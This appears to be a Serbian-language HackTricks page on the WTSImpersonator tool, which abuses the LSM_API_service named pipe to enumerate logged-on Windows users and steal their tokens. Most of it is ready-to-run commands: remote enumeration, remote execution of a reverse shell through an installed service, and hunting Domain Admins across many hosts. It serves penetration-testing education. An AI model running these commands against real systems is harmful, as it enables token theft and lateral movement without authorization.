{{#include ../../banners/hacktricks-training.md}}

Alat **WTS Impersonator** koristi **"\\pipe\LSM_API_service"** RPC Named pipe da tiho enumeriše prijavljene korisnike i preuzme njihove tokene, zaobilazeći tradicionalne tehnike Token Impersonation. Ovaj pristup olakšava neometano lateralno kretanje unutar mreža. Inovacija iza ove tehnike pripisuje se **Omri Baso, čiji je rad dostupan na [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Osnovna Funkcionalnost

Alat funkcioniše kroz niz API poziva:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Ključni Moduli i Korišćenje

- **Enumeracija Korisnika**: Lokalna i daljinska enumeracija korisnika je moguća sa alatom, koristeći komande za svaku situaciju:

- Lokalno:
```powershell
.\WTSImpersonator.exe -m enum
```
- Daljinski, specificirajući IP adresu ili ime hosta:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Izvršavanje Komandi**: Moduli `exec` i `exec-remote` zahtevaju **Service** kontekst da bi funkcionisali. Lokalno izvršavanje jednostavno zahteva WTSImpersonator izvršni fajl i komandu:

- Primer za lokalno izvršavanje komande:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe se može koristiti za dobijanje service konteksta:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Daljinsko Izvršavanje Komandi**: Uključuje kreiranje i instaliranje servisa daljinski slično PsExec.exe, omogućavajući izvršavanje sa odgovarajućim dozvolama.

- Primer daljinskog izvršavanja:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Modul za Lov na Korisnike**: Cilja specifične korisnike na više mašina, izvršavajući kod pod njihovim akreditivima. Ovo je posebno korisno za ciljanje Domain Admins sa lokalnim administratorskim pravima na nekoliko sistema.
- Primer korišćenja:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

{{#include ../../banners/hacktricks-training.md}}
